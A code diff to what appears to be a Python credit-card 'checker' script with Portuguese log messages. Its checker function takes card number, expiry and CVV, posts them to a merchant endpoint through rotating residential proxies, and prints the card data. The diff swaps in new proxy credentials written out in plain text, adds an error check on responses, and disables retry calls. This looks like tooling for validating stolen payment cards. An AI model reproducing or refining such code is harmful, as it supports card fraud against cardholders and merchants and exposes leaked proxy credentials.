@@ -230,7 +230,7 @@ def checker(card, month, year, cvv):
         if response.status_code == 200:
             
 
-            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium:qj77tznsi49h@brd.superproxy.io:22225'}
+            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
             start_time = time.time() 
             # ###
  
@@ -391,6 +391,9 @@ def checker(card, month, year, cvv):
                 }
 
                 response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+                if 'getSelectedFinancingProduct' in response.text:
+                    raise RequisicaoException()
+                
                 time.sleep(2)
                 elapsed_time = time.time() - start_time
                 MSegundos = round(elapsed_time, 2)
@@ -432,17 +435,17 @@ def checker(card, month, year, cvv):
             
     except requests.exceptions.ProxyError:
         print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
-        reteste(card, month, year, cvv)
+        #reteste(card, month, year, cvv)
         
     except requests.exceptions.ConnectionError:
         print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
-        reteste(card, month, year, cvv)
+        #reteste(card, month, year, cvv)
     except requests.exceptions.RequestException:
         print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
-        reteste(card, month, year, cvv)
+        #reteste(card, month, year, cvv)
     except RequisicaoException:
         print(Fore.LIGHTWHITE_EX + f"Bad Request ({key}): {card}|{month}|{year}|{cvv}")
-        reteste(card, month, year, cvv)
+        #reteste(card, month, year, cvv)
             
 
 
